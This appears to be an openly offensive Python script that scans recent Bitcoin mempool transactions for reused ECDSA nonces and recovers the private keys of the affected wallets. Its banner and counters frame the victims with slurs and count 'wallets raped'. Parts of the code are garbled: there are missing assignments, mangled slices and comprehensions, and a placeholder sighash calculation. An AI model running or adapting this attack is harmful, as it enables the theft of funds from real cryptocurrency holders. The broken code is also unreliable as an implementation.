import requests
import hashlib
import time
from ecdsa.numbertheory import inverse_mod
from ecdsa.ecdsa import curve_secp256k1 as curve

N = curve.order
seen =  # r -> list of (z, s, txid)
sweeps = 0

def dsha256(data):
    return hashlib.sha256(hashlib.sha256(data).digest()).digest()

def get_recent_txids():
    try:
        r = requests.get("https://mempool.space/api/mempool/recent", timeout=10)
        return for tx in r.json()[:30 ]

def get_raw_tx(txid):
    try:
        r = requests.get(f"https://mempool.space/api/tx/{txid}/raw", timeout=10)
        return r.content
    except:
        return b''

def parse_der_sig(sig_bytes):
    try:
        if sig_bytes[0] != 0x30:
            return None, None
        offset = 2
        if sig_bytes != 0x02: return None, None
        rlen = sig_bytes offset += 1
        r = int.from_bytes(sig_bytes , 'big')
        offset += rlen
        if sig_bytes != 0x02: return None, None
        offset += 1
        slen = sig_bytes offset += 1
        s = int.from_bytes(sig_bytes[offset:offset+slen], 'big')
        return r, s
    except:
        return None, None

def recover_privkey(r, s1, s2, z1, z2):
    k = ((z1 - z2) * inverse_mod((s1 - s2) % N, N)) % N
    priv = ((s1 * k - z1) * inverse_mod(r, N)) % N
    return priv, k

print("=== ARA'S WIDOWMAKER v∞ ===")
print("Hunting for retards who can't generate random numbers. Pray for their wallets.")

while True:
    try:
        txids = get_recent_txids()
        for txid in txids:
            raw = get_raw_tx(txid)
            i = 0
            while i < len(raw) - 65:
                if raw in (b'\x30\x44', b'\x30\x45'):
                    r, s = parse_der_sig(raw )
                    if r and s:
                        # NOTE: z calculation here is placeholder.
                        # Real version needs full sighash parser (python-bitcoin-utils or similar)
                        z = int.from_bytes(dsha256(raw + txid.encode()), 'big') % N
                        
                        if r in seen:
                            for old_z, old_s, old_tx in seen :
                                if old_tx != txid:
                                    priv, k = recover_privkey(r, s, old_s, z, old_z)
                                    print("\n\n🚨🚨🚨 NONCE REUSE DETECTED 🚨🚨🚨")
                                    print(f"Transactions: {old_tx} + {txid}")
                                    print(f"RECOVERED PRIVATE KEY: {hex(priv)}")
                                    print(f"NONCE k: {hex(k)}")
                                    sweeps += 1
                        else:
                            if r not in seen:
                                seen = []
                            seen .append((z, s, txid))
                i += 1
    except Exception as e:
        pass

    print(f"Batch scanned | Unique Rs: {len(seen)} | Wallets raped: {sweeps}")
    time.sleep(6)